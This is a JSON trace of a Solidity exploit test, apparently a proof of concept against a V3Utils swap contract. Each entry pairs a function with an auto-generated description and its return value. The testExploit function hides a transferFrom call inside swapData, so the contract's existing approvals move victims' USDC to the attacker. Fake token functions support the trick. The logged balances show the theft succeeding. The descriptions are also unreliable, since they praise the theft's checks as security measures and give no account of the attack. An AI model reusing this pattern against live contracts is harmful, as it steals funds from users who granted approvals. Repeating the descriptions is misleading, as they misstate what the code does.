[
    {
        "id": "204152",
        "args": "",
        "original_code": "    function testExploit() external {\n        for (uint256 i; i < victims.length; ++i) {\n            uint256 transferAmount = USDC.balanceOf(victims[i]);\n            if (USDC.allowance(victims[i], address(utils)) < transferAmount) {\n                transferAmount = USDC.allowance(victims[i], address(utils));\n                if (transferAmount == 0) continue;\n            }\n            bytes memory data = abi.encodeWithSignature(\n                \"transferFrom(address,address,uint256)\", victims[i], address(this), transferAmount\n            );\n            bytes memory swapdata = abi.encode(address(USDC), address(this), data);\n            V3Utils.SwapParams memory params = V3Utils.SwapParams({\n                tokenIn: address(this),\n                tokenOut: address(this),\n                amountIn: 1,\n                minAmountOut: 0,\n                recipient: address(this),\n                swapData: swapdata,\n                unwrap: false\n            });\n            utils.swap(params);\n            counter--;\n        }\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `testExploit` function is designed to transfer USDC tokens from a list of victim addresses to the contract's own address. It iterates through each victim, checks their USDC balance and allowance, and then uses a swap mechanism to transfer the tokens. The function also logs the attacker's USDC balance after the exploit.\n\n2. **Security mechanism:**  \n   - **External modifier:** The function is marked as `external`, meaning it can only be called from outside the contract.  \n   - **Allowance check:** Before transferring tokens, the function checks if the victim has granted sufficient allowance to the contract. If not, it adjusts the transfer amount to the allowed limit or skips the victim if no allowance is granted.  \n   - **Loop control:** The function uses a loop to process multiple victims, ensuring each one is handled individually.  \n   - **Event logging:** The function emits an event to log the attacker's USDC balance after the exploit, providing transparency and traceability.  \n\n3. **Parameter Function:**  \n   - **`victims`:** An array of addresses representing the victims from whom USDC tokens are to be transferred.  \n   - **`USDC`:** A reference to the USDC token contract, used to interact with the token's balance and allowance functions.  \n   - **`utils`:** A utility contract that facilitates the swap mechanism for transferring tokens.  \n   - **`counter`:** A variable that is decremented after each transfer, possibly used to track the number of victims processed.  \n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it performs a series of operations to transfer USDC tokens from victims to the contract's address. After processing all victims, it logs the attacker's updated USDC balance using an event. The balance is calculated by querying the USDC token contract for the balance of the contract's address.  \n\n**In summary,**  \nThe `testExploit` function is a mechanism to transfer USDC tokens from multiple victims to the contract's address. It ensures security by checking allowances and logging the final balance. The function relies on external contracts and parameters to execute the transfers and provides transparency through event logging.",
        "return_value": "Returned"
    },
    {
        "id": "9815",
        "args": "0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b",
        "original_code": "    function balanceOf(\n        address owner\n    ) external view returns (uint256) {\n        if (counter == 1) return 1;\n        else return 0;\n    }\n",
        "description": "1. **Core functions:**  \n   This function is designed to check the balance associated with a specific address (`owner`). However, its behavior is unusual because it doesn't actually check the balance of the `owner`. Instead, it returns a fixed value based on the state of a variable called `counter`. If `counter` equals 1, it returns 1; otherwise, it returns 0. This suggests the function might be a placeholder or part of a simplified example rather than a real balance-checking function.\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures it does not modify the state of the contract. This is a basic security measure to prevent unintended changes to the contract's data. There are no other explicit security mechanisms in this function, such as access control or input validation, which might be necessary in a more complex or real-world scenario.\n\n3. **Parameter Function:**  \n   The function takes one parameter, `owner`, which is an address. However, the parameter is not used in the function's logic. Instead, the function's behavior depends solely on the value of the `counter` variable. This indicates that the `owner` parameter might be irrelevant in this specific implementation.\n\n4. **Return description:**  \n   The function returns a `uint256` value, which is either 1 or 0. The logic is simple: if the `counter` variable equals 1, the function returns 1; otherwise, it returns 0. This suggests the function is not performing a meaningful balance check but rather acting as a conditional flag based on the state of `counter`.\n\n**In summary,**  \nThis function appears to be a placeholder or simplified example rather than a real balance-checking function. It returns a fixed value (1 or 0) based on the state of a `counter` variable and does not use the `owner` parameter in its logic. The `view` modifier ensures the function does not modify the contract's state, but there are no additional security measures.",
        "return_value": "19305581627 [1.93e10]"
    },
    {
        "id": "2529",
        "args": "0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b",
        "original_code": null,
        "description": null,
        "return_value": "19305581627 [1.93e10]"
    },
    {
        "id": "3426",
        "args": "0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "38315581627 [3.831e10]"
    },
    {
        "id": "2637",
        "args": "0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "38315581627 [3.831e10]"
    },
    {
        "id": "85620",
        "args": "SwapParams({ tokenIn: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, tokenOut: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amountIn: 1, minAmountOut: 0, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, swapData: 0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000067d0f9089743271058d4bf2a1a29f4e9c6fdd1b0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000047eb3cc3b00000000000000000000000000000000000000000000000000000000, unwrap: false }",
        "original_code": "    function swap(SwapParams calldata params) external payable returns (uint256 amountOut) {\n\n        _prepareAdd(params.tokenIn, IERC20(address(0)), IERC20(address(0)), params.amountIn, 0, 0);\n\n        uint amountInDelta;\n        (amountInDelta, amountOut) = _swap(params.tokenIn, params.tokenOut, params.amountIn, params.minAmountOut, params.swapData);\n\n        // send swapped amount of tokenOut\n        if (amountOut > 0) {\n            _transferToken(params.recipient, params.tokenOut, amountOut, params.unwrap);\n        }\n\n        // if not all was swapped - return leftovers of tokenIn\n        uint leftOver = params.amountIn - amountInDelta;\n        if (leftOver > 0) {\n            _transferToken(params.recipient, params.tokenIn, leftOver, params.unwrap);\n        }\n    }\n\n    /// @notice Params for swapAndMint() function\n    struct SwapAndMintParams {\n        IERC20 token0;\n        IERC20 token1;\n        uint24 fee;\n        int24 tickLower;\n        int24 tickUpper;\n\n        // how much is provided of token0 and token1\n        uint256 amount0;\n        uint256 amount1;\n        address recipient; // recipient of leftover tokens\n        address recipientNFT; // recipient of nft\n        uint256 deadline;\n\n        // source token for swaps (maybe either address(0), token0, token1 or another token)\n        // if swapSourceToken is another token than token0 or token1 -> amountIn0 + amountIn1 of swapSourceToken are expected to be available\n        IERC20 swapSourceToken;\n\n        // if swapSourceToken needs to be swapped to token0 - set values\n        uint amountIn0;\n        uint amountOut0Min;\n        bytes swapData0;\n\n        // if swapSourceToken needs to be swapped to token1 - set values\n        uint amountIn1;\n        uint amountOut1Min;\n        bytes swapData1;\n\n        // min amount to be added after swap\n        uint amountAddMin0;\n        uint amountAddMin1;\n\n        // data to be sent along newly created NFT when transfered to recipient (sent to IERC721Receiver callback)\n        bytes returnData;\n    }\n\n    /// @notice Does 1 or 2 swaps from swapSourceToken to token0 and token1 and adds as much as possible liquidity to a newly minted position.\n    /// @param params Swap and mint configuration\n    /// Newly minted NFT and leftover tokens are returned to recipient\n    function swapAndMint(SwapAndMintParams calldata params) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1) {\n        if (params.token0 == params.token1) {\n            revert SameToken();\n        }\n        _prepareAdd(params.token0, params.token1, params.swapSourceToken, params.amount0, params.amount1, params.amountIn0 + params.amountIn1);\n        (tokenId, liquidity, amount0, amount1) = _swapAndMint(params, msg.value > 0);\n    }\n\n    /// @notice Params for swapAndIncreaseLiquidity() function\n    struct SwapAndIncreaseLiquidityParams {\n        uint256 tokenId;\n\n        // how much is provided of token0 and token1\n        uint256 amount0;\n        uint256 amount1;\n        address recipient; // recipient of leftover tokens\n        uint256 deadline;\n        \n        // source token for swaps (maybe either address(0), token0, token1 or another token)\n        // if swapSourceToken is another token than token0 or token1 -> amountIn0 + amountIn1 of swapSourceToken are expected to be available\n        IERC20 swapSourceToken;\n\n        // if swapSourceToken needs to be swapped to token0 - set values\n        uint amountIn0;\n        uint amountOut0Min;\n        bytes swapData0;\n\n        // if swapSourceToken needs to be swapped to token1 - set values\n        uint amountIn1;\n        uint amountOut1Min;\n        bytes swapData1;\n\n        // min amount to be added after swap\n        uint amountAddMin0;\n        uint amountAddMin1;\n    }\n\n    /// @notice Does 1 or 2 swaps from swapSourceToken to token0 and token1 and adds as much as possible liquidity to any existing position (no need to be position owner).\n    /// @param params Swap and increase liquidity configuration\n    // Sends any leftover tokens to recipient.\n    function swapAndIncreaseLiquidity(SwapAndIncreaseLiquidityParams calldata params) external payable returns (uint128 liquidity, uint256 amount0, uint256 amount1) {\n        (, , address token0, address token1, , , , , , , , ) = nonfungiblePositionManager.positions(params.tokenId);\n        _prepareAdd(IERC20(token0), IERC20(token1), params.swapSourceToken, params.amount0, params.amount1, params.amountIn0 + params.amountIn1);\n        (liquidity, amount0, amount1) = _swapAndIncrease(params, IERC20(token0), IERC20(token1), msg.value > 0);\n    }\n\n    // checks if required amounts are provided and are exact - wraps any provided ETH as WETH\n    // if less or more provided reverts\n",
        "description": "1. Core functions:\n   - `swap`: This function facilitates the exchange of one token for another based on the provided parameters. It ensures that the specified amount of tokens is swapped and any leftover tokens are returned to the recipient.\n   - `swapAndMint`: This function performs up to two token swaps and then uses the swapped tokens to add liquidity to a new position in a liquidity pool. It also mints a new NFT representing the liquidity position and sends any leftover tokens to the recipient.\n   - `swapAndIncreaseLiquidity`: This function performs up to two token swaps and uses the swapped tokens to increase the liquidity of an existing position in a liquidity pool. Any leftover tokens are sent to the recipient.\n\n2. Security mechanism:\n   - `external payable`: Ensures that the function can receive Ether and is only callable from outside the contract.\n   - `calldata`: Specifies that the parameters are passed in a way that minimizes gas costs and prevents modification.\n   - `revert SameToken()`: Prevents the function from proceeding if the same token is provided for both `token0` and `token1`, which would be invalid for a swap.\n   - `_prepareAdd`: A helper function that checks if the required amounts of tokens are provided exactly and wraps any provided Ether into WETH. If the amounts are incorrect, the function reverts.\n\n3. Parameter Function:\n   - `params`: This is a structured set of parameters that includes details about the tokens to be swapped, the amounts involved, the recipients of the tokens, and other necessary data for the swap and liquidity operations.\n   - `msg.value`: This represents the amount of Ether sent with the transaction, which is used in functions that require Ether for operations like wrapping into WETH.\n\n4. Return description:\n   - `amountOut`: This is the amount of the output token received after the swap operation.\n   - `tokenId`, `liquidity`, `amount0`, `amount1`: These values represent the ID of the newly minted NFT, the amount of liquidity added, and the amounts of the two tokens used in the liquidity operation, respectively.\n   - `liquidity`, `amount0`, `amount1`: These values represent the amount of liquidity added to an existing position and the amounts of the two tokens used in the operation.\n\nIn summary, these functions are designed to handle token swaps and liquidity management in a decentralized finance (DeFi) context. They ensure that swaps are executed correctly, liquidity is added or increased as specified, and any leftover tokens are returned to the recipient. Security measures are in place to prevent invalid operations and ensure that the correct amounts of tokens are provided.",
        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
    },
    {
        "id": "2875",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "21376",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD], 1",
        "original_code": "    function transferFrom(address from, address to, uint256 value) external returns (bool) {\n        counter++;\n        return true;\n    }\n\n",
        "description": "1. Core functions:  \nThe `transferFrom` function is designed to simulate a token transfer operation between two addresses (`from` and `to`) for a specified `value`. However, in this specific implementation, the function does not actually perform any token transfer. Instead, it increments a `counter` variable by 1 and always returns `true`, indicating a successful operation.\n\n2. Security mechanism:  \nThis function does not include any explicit security mechanisms such as access control, input validation, or checks for sufficient token balances. The `external` modifier ensures the function can only be called from outside the contract, but there are no additional safeguards to prevent misuse or unauthorized access.\n\n3. Parameter Function:  \n- `from`: Represents the address from which the tokens are supposed to be transferred.  \n- `to`: Represents the address to which the tokens are supposed to be sent.  \n- `value`: Represents the amount of tokens intended to be transferred.  \nIn this implementation, these parameters are not used, and the function only increments a counter.\n\n4. Return description:  \nThe function always returns `true`, regardless of the input parameters or the state of the contract. This suggests that the function is designed to simulate a successful operation without performing any actual logic related to token transfers.\n\nIn summary,  \nThe `transferFrom` function is a placeholder that increments a counter and always returns `true`. It does not perform any token transfer logic or include security measures, and its parameters are unused in the current implementation.",
        "return_value": "true"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "841",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1",
        "original_code": "    function approve(address spender, uint256 value) external returns (bool) {\n        return true;\n    }\n\n",
        "description": "1. **Core functions**:  \n   The `approve` function is designed to allow an account (the owner) to grant permission to another account (the spender) to spend a specified amount of tokens on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. **Security mechanism**:  \n   The function uses the `external` modifier, which means it can only be called from outside the contract, ensuring internal state changes are controlled. However, this specific implementation lacks additional security checks, such as verifying the spender's address or ensuring the owner has sufficient balance, which could be vulnerabilities.\n\n3. **Parameter Function**:  \n   - `spender`: This is the address of the account that is being granted permission to spend tokens.  \n   - `value`: This is the maximum amount of tokens the spender is allowed to spend on behalf of the owner.  \n\n4. **Return description**:  \n   The function always returns `true`, indicating that the approval was successful. However, this is a placeholder implementation and does not perform any actual checks or state changes.  \n\nIn summary, the `approve` function is intended to allow token owners to delegate spending permissions to others, but this specific implementation is overly simplistic and lacks essential security and validation mechanisms.",
        "return_value": "true"
    },
    {
        "id": "41492",
        "args": "0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19305581627 [1.93e10]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "40697",
        "args": "0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19305581627 [1.93e10]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "841",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "884",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1",
        "original_code": "    function transfer(address to, uint256 value) external returns (bool) {\n        return true;\n    }\n\n",
        "description": "1. Core functions:  \nThe `transfer` function is designed to move a specified amount of tokens from the caller's account to another account. Its primary role is to facilitate the transfer of tokens between two addresses in a blockchain system.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which ensures it can only be called from outside the contract, not from within. This helps prevent unauthorized internal calls. However, the function lacks additional security measures like input validation or balance checks, which could lead to vulnerabilities if not handled properly.\n\n3. Parameter Function:  \n- `to`: This parameter specifies the recipient's address where the tokens will be sent.  \n- `value`: This parameter defines the amount of tokens to be transferred.  \n\n4. Return description:  \nThe function always returns `true`, indicating that the transfer was successful. However, this is a placeholder implementation and does not include actual transfer logic or checks, which would be necessary in a real-world scenario.  \n\nIn summary, the `transfer` function is a basic implementation for token transfers but lacks essential security and functionality for practical use.",
        "return_value": "true"
    },
    {
        "id": "3315",
        "args": "0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2",
        "original_code": null,
        "description": null,
        "return_value": "608929547 [6.089e8]"
    },
    {
        "id": "2529",
        "args": "0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2",
        "original_code": null,
        "description": null,
        "return_value": "608929547 [6.089e8]"
    },
    {
        "id": "3426",
        "args": "0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2, utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "500000000 [5e8]"
    },
    {
        "id": "2637",
        "args": "0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2, utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "500000000 [5e8]"
    },
    {
        "id": "1426",
        "args": "0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2, utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "500000000 [5e8]"
    },
    {
        "id": "637",
        "args": "0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2, utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "500000000 [5e8]"
    },
    {
        "id": "55720",
        "args": "SwapParams({ tokenIn: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, tokenOut: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amountIn: 1, minAmountOut: 0, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, swapData: 0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000004107a0a4a50ac2c4cc8c5a3954bc01ff134506b20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000001dcd650000000000000000000000000000000000000000000000000000000000, unwrap: false }",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
    },
    {
        "id": "875",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "21376",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD], 1",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "841",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "13592",
        "args": "0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000 [5e8]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "12797",
        "args": "0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000 [5e8]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "841",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "886",
        "args": "utils: [0x531110418d8591C92e9cBBFC722Db8FFb604FAFD]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "884",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "1315",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "19805581627 [1.98e10]"
    },
    {
        "id": "529",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "19805581627 [1.98e10]"
    },
    {
        "id": "3164",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "6"
    },
    {
        "id": "2381",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "6"
    }
]